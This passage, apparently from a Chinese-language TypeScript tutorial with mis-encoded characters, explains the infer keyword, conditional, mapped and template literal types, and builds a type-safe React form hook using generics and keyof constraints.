<p>TS çš„æ‰§è¡Œé€»è¾‘ï¼š</p>
<ol>
<li>æ‹¿ <code>T</code> å»åŒ¹é… <code>Promise&lt;?&gt;</code> è¿™ä¸ªæ¨¡å¼</li>
<li>å¦‚æœåŒ¹é…æˆåŠŸï¼ŒæŠŠ <code>?</code> ä½ç½®çš„ç±»å‹èµ‹å€¼ç»™ <code>U</code></li>
<li>ç„¶å <code>U</code> å°±å¯ä»¥åœ¨ <code>?</code> åé¢ä½¿ç”¨äº†</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ ä¸èƒ½å•ç‹¬ä½¿ç”¨ infer</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Bad</span>&lt;T&gt; = infer U;  <span class="hljs-comment">// é”™è¯¯ï¼šinfer åªèƒ½åœ¨æ¡ä»¶ç±»å‹çš„ extends å­å¥ä¸­ä½¿ç”¨</span>
<span class="hljs-comment">// å› ä¸º TS ä¸çŸ¥é“ U åº”è¯¥ä»å“ªé‡Œæ¨æ–­ï¼Œæ²¡æœ‰æ¨¡å¼åŒ¹é…å°±æ²¡æœ‰"æ•è·"çš„æ¥æº</span>
</code></pre>
<p>å°±åƒæ­£åˆ™è¡¨è¾¾å¼çš„æ•è·ç»„å¿…é¡»åœ¨åŒ¹é…æ¨¡å¼é‡Œï¼Œä¸èƒ½å•ç‹¬å†™ <code>(\w+)</code>ã€‚</p>
<h4 data-id="heading-19">ç¤ºä¾‹ï¼šæå– Promise å†…éƒ¨ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Unwrap</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer U&gt; ? U : T;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;;  <span class="hljs-comment">// string</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">Unwrap</span>&lt;<span class="hljs-built_in">number</span>&gt;;           <span class="hljs-comment">// number</span>
</code></pre>
<p>æ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<ol>
<li><code>T extends Promise&lt;infer U&gt;</code> â€” T æ˜¯ä¸æ˜¯ <code>Promise&lt;æŸä¸ªç±»å‹&gt;</code>ï¼Ÿ</li>
<li><code>infer U</code> â€” å¦‚æœæ˜¯ï¼ŒæŠŠé‚£ä¸ªç±»å‹æ•è·å‡ºæ¥å« <code>U</code></li>
<li><code>? U : T</code> â€” æ¡ä»¶æˆç«‹è¿”å› <code>U</code>ï¼Œå¦åˆ™è¿”å› <code>T</code></li>
</ol>
<h4 data-id="heading-20">ç¤ºä¾‹ï¼šæå–å‡½æ•°è¿”å›å€¼ç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Fn</span> = <span class="hljs-function">(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) =&gt;</span> { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt;;  <span class="hljs-comment">// { name: string; age: number }</span>
</code></pre>
<h4 data-id="heading-21">ç¤ºä¾‹ï¼š<code>infer</code> é…åˆæ¨¡æ¿å­—é¢é‡æå–å­—ç¬¦ä¸²</h4>
<p><code>infer</code> ä¸ä»…èƒ½æå–æ³›å‹å‚æ•°ï¼Œè¿˜èƒ½ä»å­—ç¬¦ä¸²å­—é¢é‡ç±»å‹ä¸­æå–éƒ¨åˆ†å†…å®¹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä» 'GET /api/user/:id' ä¸­æå–æ–¹æ³•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractMethod</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${infer M}</span> <span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span>`</span> ? M : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// 'GET'</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Method2</span> = <span class="hljs-title class_">ExtractMethod</span>&lt;<span class="hljs-string">'POST /api/login'</span>&gt;;   <span class="hljs-comment">// 'POST'</span>

<span class="hljs-comment">// ä» 'GET /api/user/:id' ä¸­æå–è·¯å¾„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtractPath</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-built_in">string</span>}</span> <span class="hljs-subst">${infer P}</span>`</span> ? P : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Path</span> = <span class="hljs-title class_">ExtractPath</span>&lt;<span class="hljs-string">'GET /api/user/:id'</span>&gt;;  <span class="hljs-comment">// '/api/user/:id'</span>
</code></pre>
<p>æ‰§è¡Œè¿‡ç¨‹ï¼ˆä»¥ <code>ExtractMethod</code> ä¸ºä¾‹ï¼‰ï¼š</p>
<ol>
<li><code>T = 'GET /api/user/:id'</code></li>
<li>æ¨¡å¼ <code>${infer M} ${string}</code> è¡¨ç¤ºï¼š<code>M</code> + ç©ºæ ¼ + ä»»æ„å­—ç¬¦ä¸²</li>
<li>TS å°è¯•åŒ¹é…ï¼Œå‘ç° <code>M = 'GET'</code>ï¼Œåé¢æ˜¯ <code>' /api/user/:id'</code></li>
<li>åŒ¹é…æˆåŠŸï¼Œè¿”å› <code>M</code>ï¼Œå³ <code>'GET'</code></li>
</ol>
<p>è¿™åœ¨æ„å»ºç±»å‹å®‰å…¨çš„è·¯ç”±ã€API å®¢æˆ·ç«¯æ—¶éå¸¸æœ‰ç”¨ã€‚</p>
<h3 data-id="heading-22">æ˜ å°„ç±»å‹ï¼šæ‰¹é‡å˜æ¢å¯¹è±¡ç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = { [K <span class="hljs-keyword">in</span> keyof T]?: T[K] };
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Readonly</span>&lt;T&gt; = { <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof T]: T[K] };
</code></pre>
<h3 data-id="heading-23">æ¨¡æ¿å­—é¢é‡ç±»å‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">EventName</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <span class="hljs-string">`on<span class="hljs-subst">${Capitalize&lt;T&gt;}</span>`</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ClickEvent</span> = <span class="hljs-title class_">EventName</span>&lt;<span class="hljs-string">'click'</span>&gt;;  <span class="hljs-comment">// "onClick"</span>
</code></pre>
<hr/>
<h2 data-id="heading-24">äº”ã€å®æˆ˜æ¡ˆä¾‹ï¼šç±»å‹å®‰å…¨çš„è¡¨å• Hook</h2>
<blockquote>
<p>æœ¬æ¡ˆä¾‹å®Œæ•´å±•ç¤ºä¸¤ä¸ªæ ¸å¿ƒç†å¿µï¼š</p>
<ul>
<li><strong>ç±»å‹æ¨æ–­æŠŠè¿è¡Œæ—¶é”™è¯¯å˜ç¼–è¯‘æ—¶é”™è¯¯</strong>ï¼šå­—æ®µåæ‹¼é”™ã€å€¼ç±»å‹ä¸å¯¹ï¼Œç¼–è¯‘æ—¶å°±æŠ¥é”™</li>
<li><strong>æ³›å‹è®©ç±»å‹"æµåŠ¨"</strong>ï¼šåˆå§‹å€¼çš„ç±»å‹ä¿¡æ¯ä¸€è·¯æµåŠ¨åˆ° <code>setField</code>ï¼Œä¸ä¼šä¸¢å¤±</li>
</ul>
</blockquote>
<h3 data-id="heading-25">éœ€æ±‚</h3>
<ul>
<li>ä¼ å…¥åˆå§‹å€¼ï¼Œè‡ªåŠ¨æ¨å¯¼è¡¨å•å­—æ®µç±»å‹</li>
<li><code>values</code>ã€<code>errors</code>ã€<code>onChange</code> éƒ½è¦ç±»å‹å®‰å…¨</li>
<li>å­—æ®µåå†™é”™è¦æŠ¥é”™ï¼Œå€¼ç±»å‹ä¸å¯¹è¦æŠ¥é”™</li>
</ul>
<h3 data-id="heading-26">æ²¡æœ‰ç±»å‹æ¨å¯¼çš„ç—›è‹¦</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âŒ æ‰‹åŠ¨æŒ‡å®šç±»å‹ï¼Œå†™ä¸¤éï¼Œå®¹æ˜“ä¸åŒæ­¥</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">FormValues</span> {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">const</span> { values, setField } = useForm&lt;<span class="hljs-title class_">FormValues</span>&gt;({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-string">''</span>
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'test'</span>);  <span class="hljs-comment">// æ‹¼å†™é”™è¯¯ï¼Œè¿è¡Œæ—¶æ‰å‘ç°</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'18'</span>);         <span class="hljs-comment">// ç±»å‹é”™äº†ï¼Œstring ç»™äº† number å­—æ®µ</span>
</code></pre>
<h3 data-id="heading-27">å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">const</span> [errors, setErrors] = useState&lt;<span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Record</span>&lt;keyof T, <span class="hljs-built_in">string</span>&gt;&gt;&gt;({});

  <span class="hljs-comment">// K extends keyof Tï¼šå­—æ®µåå¿…é¡»æ˜¯ T çš„ key</span>
  <span class="hljs-comment">// T[K]ï¼šå€¼ç±»å‹è‡ªåŠ¨è·Ÿç€å­—æ®µèµ°</span>
  <span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K]) {
    <span class="hljs-title function_">setValues</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: value }));
  }

  <span class="hljs-keyword">function</span> setError&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>) {
    <span class="hljs-title function_">setErrors</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, [field]: message }));
  }

  <span class="hljs-keyword">return</span> { values, errors, setField, setError };
}
</code></pre>
<h3 data-id="heading-28">ä½¿ç”¨æ•ˆæœ</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});

<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// âœ… </span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);              <span class="hljs-comment">// âœ…</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);     <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šå­—æ®µåä¸å­˜åœ¨</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);            <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯ï¼šæœŸæœ› numberï¼Œç»™äº† string</span>
</code></pre>
<h3 data-id="heading-29">ç¼–è¾‘å™¨æ™ºèƒ½æç¤º</h3>
<p>ç±»å‹æ¨æ–­ä¸ä»…èƒ½æŠ¥é”™ï¼Œè¿˜èƒ½æä¾›æ™ºèƒ½æç¤ºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'|'</span>)  <span class="hljs-comment">// å…‰æ ‡åœ¨è¿™é‡Œæ—¶ï¼Œç¼–è¾‘å™¨è‡ªåŠ¨å¼¹å‡ºè¡¥å…¨åˆ—è¡¨ï¼š</span>
               <span class="hljs-comment">// - username</span>
               <span class="hljs-comment">// - age</span>
               <span class="hljs-comment">// - isAdmin</span>

values.|       <span class="hljs-comment">// å…‰æ ‡åœ¨è¿™é‡Œæ—¶ï¼Œç¼–è¾‘å™¨è‡ªåŠ¨æç¤ºæ‰€æœ‰å¯ç”¨å­—æ®µå’Œç±»å‹ï¼š</span>
               <span class="hljs-comment">// - username: string</span>
               <span class="hljs-comment">// - age: number</span>
               <span class="hljs-comment">// - isAdmin: boolean</span>
</code></pre>
<p>è¿™æ˜¯å› ä¸º TS æ¨æ–­å‡ºäº†å…·ä½“ç±»å‹ï¼Œç¼–è¾‘å™¨ï¼ˆé€šè¿‡ TypeScript Language Serverï¼‰å°±èƒ½æä¾›ç²¾ç¡®çš„è¡¥å…¨å’Œç±»å‹ä¿¡æ¯ã€‚å¦‚æœç±»å‹ä¿¡æ¯ä¸¢å¤±ï¼ˆæ¯”å¦‚å˜æˆ <code>Record&lt;string, unknown&gt;</code>ï¼‰ï¼Œè¿™äº›æç¤ºå°±æ²¡äº†ã€‚</p>
<h3 data-id="heading-30">ç±»å‹æ¨æ–­çš„å®Œæ•´æ‰§è¡Œè¿‡ç¨‹</h3>
<h4 data-id="heading-31">ç¬¬ä¸€æ­¥ï¼šè°ƒç”¨ useFormï¼Œæ¨æ–­æ³›å‹ T</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> { values, setField } = <span class="hljs-title function_">useForm</span>({
  <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span>,
});
</code></pre>
<p>TS çœ‹åˆ°ä½ ä¼ å…¥çš„å¯¹è±¡å­—é¢é‡ï¼Œè‡ªåŠ¨æ¨æ–­å‡ºæ³›å‹ <code>T</code> çš„å…·ä½“ç±»å‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript">T = {
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">isAdmin</span>: <span class="hljs-built_in">boolean</span>;
}
</code></pre>
<p>æ­¤æ—¶å‡½æ•°ç­¾åç›¸å½“äºï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: { username: <span class="hljs-built_in">string</span>; age: <span class="hljs-built_in">number</span>; isAdmin: <span class="hljs-built_in">boolean</span> }</span>)
</code></pre>
<h4 data-id="heading-32">ç¬¬äºŒæ­¥ï¼škeyof T ç”Ÿæˆå­—æ®µåè”åˆç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript">keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
</code></pre>
<p>è¿™æ„å‘³ç€æ‰€æœ‰ç”¨åˆ° <code>keyof T</code> çš„åœ°æ–¹ï¼Œåªèƒ½æ˜¯è¿™ä¸‰ä¸ªå­—ç¬¦ä¸²ä¹‹ä¸€ã€‚</p>
<h4 data-id="heading-33">ç¬¬ä¸‰æ­¥ï¼šsetField è°ƒç”¨æ—¶çš„æ¨æ–­</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
</code></pre>
<p>å½“ä½ è°ƒç”¨ <code>setField('age', 25)</code> æ—¶ï¼š</p>
<ol>
<li>TS çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <code>'age'</code></li>
<li>æ¨æ–­å‡º <code>K = 'age'</code></li>
<li>è®¡ç®— <code>T[K]</code> = <code>T['age']</code> = <code>number</code></li>
<li>æ‰€ä»¥ç¬¬äºŒä¸ªå‚æ•° <code>value</code> å¿…é¡»æ˜¯ <code>number</code></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>);      <span class="hljs-comment">// âœ… K='age', T[K]=number, 25 æ˜¯ number</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-string">'25'</span>);    <span class="hljs-comment">// âŒ K='age', T[K]=number, '25' æ˜¯ stringï¼Œç±»å‹ä¸åŒ¹é…</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'john'</span>); <span class="hljs-comment">// âœ… K='username', T[K]=string</span>
<span class="hljs-title function_">setField</span>(<span class="hljs-string">'isAdmin'</span>, <span class="hljs-literal">true</span>);    <span class="hljs-comment">// âœ… K='isAdmin', T[K]=boolean</span>
</code></pre>
<h4 data-id="heading-34">ç¬¬å››æ­¥ï¼šé”™è¯¯å­—æ®µåçš„æ‹¦æˆª</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">setField</span>(<span class="hljs-string">'usernmae'</span>, <span class="hljs-string">'john'</span>);  <span class="hljs-comment">// âŒ ç¼–è¯‘é”™è¯¯</span>
</code></pre>
<p>TS æ£€æŸ¥ <code>'usernmae'</code> æ˜¯å¦å±äº <code>keyof T</code>ï¼ˆå³ <code>'username' | 'age' | 'isAdmin'</code>ï¼‰ï¼Œå‘ç°ä¸å±äºï¼Œç›´æ¥æŠ¥é”™ã€‚</p>
<h4 data-id="heading-35">å®Œæ•´æ¨æ–­æµç¨‹å›¾</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">false</span> })
    â”‚
    â–¼
T è¢«æ¨æ–­ä¸º { username: <span class="hljs-keyword">string</span>; age: number; isAdmin: <span class="hljs-keyword">boolean</span> }
    â”‚
    â–¼
keyof T = <span class="hljs-string">'username'</span> | <span class="hljs-string">'age'</span> | <span class="hljs-string">'isAdmin'</span>
    â”‚
    â–¼
<span class="hljs-title function_ invoke__">setField</span>(<span class="hljs-string">'age'</span>, <span class="hljs-number">25</span>) è°ƒç”¨æ—¶ï¼š
    â”‚
    â”œâ”€ K è¢«æ¨æ–­ä¸º <span class="hljs-string">'age'</span>ï¼ˆå› ä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ <span class="hljs-string">'age'</span>ï¼‰
    â”‚
    â”œâ”€ T[K] = T[<span class="hljs-string">'age'</span>] = number
    â”‚
    â””â”€ æ£€æŸ¥ <span class="hljs-number">25</span> æ˜¯å¦ç¬¦åˆ number âœ…
</code></pre>
<h4 data-id="heading-36">ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡æœ‰æ•ˆ</h4>
<p>å…³é”®åœ¨äº <strong>æ³›å‹ K æ˜¯åœ¨è°ƒç”¨æ—¶æ‰ç¡®å®šçš„</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> setField&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">field</span>: K, <span class="hljs-attr">value</span>: T[K])
<span class="hljs-comment">//              â†‘ æ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ¨æ–­å‡ºå…·ä½“çš„ K</span>
</code></pre>
<ul>
<li>è°ƒç”¨ <code>setField('age', ...)</code> æ—¶ï¼ŒK = 'age'</li>
<li>è°ƒç”¨ <code>setField('username', ...)</code> æ—¶ï¼ŒK = 'username'</li>
</ul>
<p>ç„¶å <code>T[K]</code> ä¼šæ ¹æ® K çš„å€¼åŠ¨æ€è®¡ç®—å‡ºå¯¹åº”çš„ç±»å‹ï¼Œå®ç°äº†"å­—æ®µåå’Œå€¼ç±»å‹çš„ç»‘å®š"ã€‚</p>
<h3 data-id="heading-37">æ·±å…¥ç†è§£ï¼šæ³›å‹å˜é‡ä¸ extends çº¦æŸ</h3>
<h4 data-id="heading-38">æ³›å‹å˜é‡çš„æœ¬è´¨</h4>
<p>æ³›å‹å˜é‡ <code>T</code> æ˜¯ä¸€ä¸ª<strong>ç±»å‹å ä½ç¬¦</strong>ï¼Œå®ƒçš„å…·ä½“å€¼ç”±è°ƒç”¨æ—¶ä¼ å…¥çš„å‚æ•°<strong>åæ¨ç¡®å®š</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
<span class="hljs-comment">//              â†‘ T æ˜¯å ä½ç¬¦ï¼Œè°ƒç”¨æ—¶æ‰çŸ¥é“å…·ä½“æ˜¯ä»€ä¹ˆç±»å‹</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è°ƒç”¨æ—¶ï¼ŒTS æ ¹æ®å‚æ•°åæ¨ T çš„å€¼</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> })
<span class="hljs-comment">//      â””â”€ å‚æ•°ç±»å‹æ˜¯ { username: string; age: number }</span>
<span class="hljs-comment">//         æ‰€ä»¥ T = { username: string; age: number }</span>
</code></pre>
<h4 data-id="heading-39"><code>extends</code> çº¦æŸçš„ä½œç”¨</h4>
<p><code>T extends Record&lt;string, unknown&gt;</code> çš„æ„æ€æ˜¯ï¼š<strong>T å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼Œä½†å¿…é¡»æ»¡è¶³ <code>Record&lt;string, unknown&gt;</code> çš„çº¦æŸ</strong>ã€‚</p>
<p><code>Record&lt;string, unknown&gt;</code> è¡¨ç¤º"key æ˜¯ stringï¼Œvalue æ˜¯ä»»æ„ç±»å‹çš„å¯¹è±¡"ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ™®é€šå¯¹è±¡ã€‚</p>
<h4 data-id="heading-40">å¦‚æœä¼ å…¥ä¸ç¬¦åˆçº¦æŸçš„ç±»å‹ä¼šæ€æ ·ï¼Ÿ</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// âœ… ç¬¦åˆçº¦æŸï¼šæ™®é€šå¯¹è±¡</span>
<span class="hljs-title function_">useForm</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šæ•°ç»„ä¸æ˜¯ Record&lt;string, unknown&gt;</span>
<span class="hljs-title function_">useForm</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šArgument of type 'number[]' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šåŸå§‹ç±»å‹</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-string">'hello'</span>);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯ï¼šArgument of type 'string' is not assignable to parameter of type 'Record&lt;string, unknown&gt;'</span>

<span class="hljs-comment">// âŒ ä¸ç¬¦åˆçº¦æŸï¼šnull</span>
<span class="hljs-title function_">useForm</span>(<span class="hljs-literal">null</span>);
<span class="hljs-comment">// ç¼–è¯‘é”™è¯¯</span>
</code></pre>
<h4 data-id="heading-41">extends çº¦æŸ vs ç›´æ¥æŒ‡å®šç±»å‹</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ–¹å¼ä¸€ï¼šç›´æ¥æŒ‡å®šå‚æ•°ç±»å‹ï¼ˆä¸çµæ´»ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useForm</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>)

<span class="hljs-comment">// æ–¹å¼äºŒï¼šæ³›å‹ + extends çº¦æŸï¼ˆçµæ´»ä¸”å®‰å…¨ï¼‰</span>
<span class="hljs-keyword">function</span> useForm&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T)
</code></pre>
<p><strong>æ–¹å¼ä¸€çš„é—®é¢˜ï¼šç±»å‹ä¿¡æ¯ä¸¢å¤±</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›´æ¥æŒ‡å®šç±»å‹çš„å®ç°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">useFormBad</span>(<span class="hljs-params">initialValues: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;</span>) {
  <span class="hljs-keyword">const</span> [values, setValues] = <span class="hljs-title function_">useState</span>(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormBad</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values çš„ç±»å‹æ˜¯ Record&lt;string, unknown&gt;</span>
<span class="hljs-comment">// TS åªçŸ¥é“å®ƒæ˜¯"æŸä¸ªå¯¹è±¡"ï¼Œä¸çŸ¥é“å…·ä½“æœ‰å“ªäº›å­—æ®µ</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// ç±»å‹æ˜¯ unknownï¼Œä¸æ˜¯ string</span>
values.<span class="hljs-property">age</span>;       <span class="hljs-comment">// ç±»å‹æ˜¯ unknownï¼Œä¸æ˜¯ number</span>
values.<span class="hljs-property">foo</span>;       <span class="hljs-comment">// âœ… ä¸æŠ¥é”™ï¼TS è®¤ä¸ºä»»ä½• string key éƒ½å¯èƒ½å­˜åœ¨</span>

<span class="hljs-comment">// ä½¿ç”¨æ—¶å¿…é¡»æ‰‹åŠ¨æ–­è¨€ï¼Œå¾ˆéº»çƒ¦ä¸”ä¸å®‰å…¨</span>
<span class="hljs-keyword">const</span> name = values.<span class="hljs-property">username</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
</code></pre>
<p><strong>æ–¹å¼äºŒçš„ä¼˜åŠ¿ï¼šä¿ç•™å…·ä½“ç±»å‹</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ³›å‹ + extends çº¦æŸçš„å®ç°</span>
<span class="hljs-keyword">function</span> useFormGood&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">unknown</span>&gt;&gt;(<span class="hljs-attr">initialValues</span>: T) {
  <span class="hljs-keyword">const</span> [values, setValues] = useState&lt;T&gt;(initialValues);
  <span class="hljs-keyword">return</span> { values };
}

<span class="hljs-keyword">const</span> { values } = <span class="hljs-title function_">useFormGood</span>({ <span class="hljs-attr">username</span>: <span class="hljs-string">''</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">0</span> });

<span class="hljs-comment">// values çš„ç±»å‹æ˜¯ { username: string; age: number }</span>
<span class="hljs-comment">// TS çŸ¥é“å…·ä½“æœ‰å“ªäº›å­—æ®µï¼Œæ¯ä¸ªå­—æ®µæ˜¯ä»€ä¹ˆç±»å‹</span>

values.<span class="hljs-property">username</span>;  <span class="hljs-comment">// ç±»å‹æ˜¯ string âœ…</span>
